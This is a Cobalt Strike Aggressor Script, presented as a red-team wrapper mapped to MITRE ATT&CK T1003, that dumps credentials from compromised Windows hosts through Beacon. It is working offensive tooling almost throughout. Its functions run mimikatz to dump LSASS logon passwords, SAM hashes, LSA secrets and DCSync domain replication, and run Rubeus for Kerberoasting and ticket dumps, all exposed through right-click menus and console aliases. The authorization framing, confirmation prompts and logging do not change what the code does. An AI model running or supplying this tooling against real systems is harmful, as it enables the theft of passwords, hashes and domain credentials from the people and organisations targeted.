###############################################################################
# credential-access-wrapper.cna
#
# Aggressor Script wrapper for credential-access TTP emulation
# Maps to MITRE ATT&CK T1003 (OS Credential Dumping) and related techniques.
#
# Designed for authorized red team engagements. Centralizes invocation,
# adds OPSEC guardrails, logging, and consistent menu integration.
###############################################################################

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------
%CONFIG["log_dir"]        = script_resource("logs");
%CONFIG["require_confirm"] = "true";   # prompt before noisy actions
%CONFIG["default_method"]  = "execute-assembly"; # or "mimikatz" builtin

# ---------------------------------------------------------------------------
# Utility: timestamped logging of every action for engagement reporting
# ---------------------------------------------------------------------------
sub log_action {
    local('$bid $action $handle $stamp $line');
    ($bid, $action) = @_;

    $stamp = strftime("%Y-%m-%d %H:%M:%S", ticks());
    mkdir(%CONFIG["log_dir"]);
    $handle = openf(">>" . getFileProper(%CONFIG["log_dir"], "credaccess.log"));
    $line = "[" . $stamp . "] beacon=" . $bid . " host=" . binfo($bid, "computer") .
            " user=" . binfo($bid, "user") . " action=" . $action;
    println($handle, $line);
    closef($handle);

    # Mirror to the Beacon log / event log for live operators
    blog($bid, "[cred-access] " . $action);
}

# ---------------------------------------------------------------------------
# Utility: confirmation gate for noisy / high-signature actions
# ---------------------------------------------------------------------------
sub confirm_action {
    local('$bid $desc');
    ($bid, $desc) = @_;

    if (%CONFIG["require_confirm"] eq "true") {
        return prompt_confirm("Run on " . binfo($bid, "computer") . "?\n\n" . $desc);
    }
    return 1;
}

# ---------------------------------------------------------------------------
# Core dispatcher: runs a given command via the configured delivery method
# ---------------------------------------------------------------------------
sub run_credtool {
    local('$bid $tool $args $desc');
    ($bid, $tool, $args, $desc) = @_;

    if (!confirm_action($bid, $desc)) {
        blog($bid, "[cred-access] user cancelled: " . $desc);
        return;
    }

    log_action($bid, $tool . " " . $args);

    if ($tool eq "mimikatz") {
        # Cobalt Strike's built-in mimikatz integration (in-memory, no disk)
        bmimikatz($bid, $args);
    }
    else if ($tool eq "execute-assembly") {
        # Run a .NET credential tool (e.g. SharpKatz, Rubeus) reflectively
        # $args here is "path/to/assembly.exe <assembly-args>"
        local('@parts $asm $asmargs');
        @parts = split(' ', $args);
        $asm = @parts[0];
        $asmargs = join(' ', sublist(@parts, 1));
        bexecute_assembly($bid, $asm, $asmargs);
    }
    else if ($tool eq "powerpick") {
        # Unmanaged PowerShell (no powershell.exe spawn) for PS-based tooling
        bpowerpick($bid, $args);
    }
    else {
        berror($bid, "[cred-access] unknown delivery method: " . $tool);
    }
}

# ---------------------------------------------------------------------------
# Pre-flight OPSEC checks before any credential-access action
# ---------------------------------------------------------------------------
sub preflight_check {
    local('$bid $issues');
    $bid = $1;
    $issues = "";

    # Warn if not elevated (most LSASS access needs SeDebug / SYSTEM)
    if (binfo($bid, "is_admin") ne "1" && binfo($bid, "user") !~ '\\*SYSTEM') {
        $issues .= "- Beacon is NOT elevated; LSASS access will likely fail.\n";
    }

        # Warn on low sleep / interactive beacons (noisy for long tasks)
    if (int(binfo($bid, "sleep")) > 5000) {
        $issues .= "- Beacon sleep is high; output may be delayed.\n";
    }

    if ($issues ne "") {
        show_message("Pre-flight warnings for " . binfo($bid, "computer") . ":\n\n" . $issues);
    }
}

# ---------------------------------------------------------------------------
# High-level technique wrappers (named by ATT&CK sub-technique)
# ---------------------------------------------------------------------------

# T1003.001 - LSASS Memory
sub tt_lsass_logonpasswords {
    preflight_check($1);
    run_credtool($1, "mimikatz", "!sekurlsa::logonpasswords",
                 "Dump plaintext/hashes from LSASS (T1003.001). HIGH signature.");
}

# T1003.002 - Security Account Manager (local SAM hashes)
sub tt_sam_dump {
    preflight_check($1);
    run_credtool($1, "mimikatz", "!lsadump::sam",
                 "Dump local SAM database hashes (T1003.002).");
}

# T1003.004 - LSA Secrets
sub tt_lsa_secrets {
    preflight_check($1);
    run_credtool($1, "mimikatz", "!lsadump::secrets",
                 "Dump LSA secrets (T1003.004).");
}

# T1003.006 - DCSync (domain replication)
sub tt_dcsync {
    local('$bid $domain $user');
    $bid = $1;
    $domain = prompt_text("Target domain (FQDN):", "corp.local");
    $user   = prompt_text("Target account (e.g. krbtgt or DOMAIN\\Administrator):", "krbtgt");
    if ($domain eq "" || $user eq "") { return; }
    run_credtool($bid, "mimikatz",
        "!lsadump::dcsync /domain:" . $domain . " /user:" . $user,
        "DCSync replication of " . $user . " (T1003.006). DC-side detectable.");
}

# T1558.003 - Kerberoasting (via Rubeus)
sub tt_kerberoast {
    run_credtool($1, "execute-assembly",
        script_resource("tools/Rubeus.exe") . " kerberoast /nowrap",
        "Kerberoast SPNs via Rubeus (T1558.003).");
}

# T1003 - generic ticket / credential harvest (Rubeus dump)
sub tt_ticket_dump {
    preflight_check($1);
    run_credtool($1, "execute-assembly",
        script_resource("tools/Rubeus.exe") . " dump /nowrap",
        "Dump Kerberos tickets via Rubeus (T1003 / T1550.003).");
}

# ---------------------------------------------------------------------------
# Beacon right-click menu integration
# ---------------------------------------------------------------------------
popup beacon_bottom {
    menu "&Credential Access (T1003)" {
        item "LSASS: logonpasswords" {
            foreach $bid (@_) { tt_lsass_logonpasswords($bid); }
        }
        item "SAM hashes (local)" {
            foreach $bid (@_) { tt_sam_dump($bid); }
        }
        item "LSA secrets" {
            foreach $bid (@_) { tt_lsa_secrets($bid); }
        }
        separator();
        item "DCSync (domain)" {
            foreach $bid (@_) { tt_dcsync($bid); }
        }
        separator();
        item "Kerberoast (Rubeus)" {
            foreach $bid (@_) { tt_kerberoast($bid); }
        }
        item "Dump tickets (Rubeus)" {
            foreach $bid (@_) { tt_ticket_dump($bid); }
        }
        separator();
        item "Toggle confirmation prompts" {
            if (%CONFIG["require_confirm"] eq "true") {
                %CONFIG["require_confirm"] = "false";
                show_message("Confirmation prompts DISABLED.");
            } else {
                %CONFIG["require_confirm"] = "true";
                show_message("Confirmation prompts ENABLED.");
            }
        }
    }
}

# ---------------------------------------------------------------------------
# Console aliases for keyboard-driven operators
# ---------------------------------------------------------------------------
alias creddump {
    tt_lsass_logonpasswords($1);
}

alias dcsync {
    # usage: dcsync <domain> <user>
    if (size(@_) < 3) {
        berror($1, "usage: dcsync <domain> <user>");
        return;
    }
    run_credtool($1, "mimikatz",
        "!lsadump::dcsync /domain:" . $2 . " /user:" . $3,
        "DCSync " . $3 . "@" . $2 . " (T1003.006).");
}

# ---------------------------------------------------------------------------
# Load banner
# ---------------------------------------------------------------------------
on ready {
    println("[+] credential-access-wrapper.cna loaded.");
    println("    Right-click a Beacon -> Credential Access (T1003)");
    println("    Aliases: creddump, dcsync <domain> <user>");
    println("    Logging to: " . %CONFIG["log_dir"]);
}
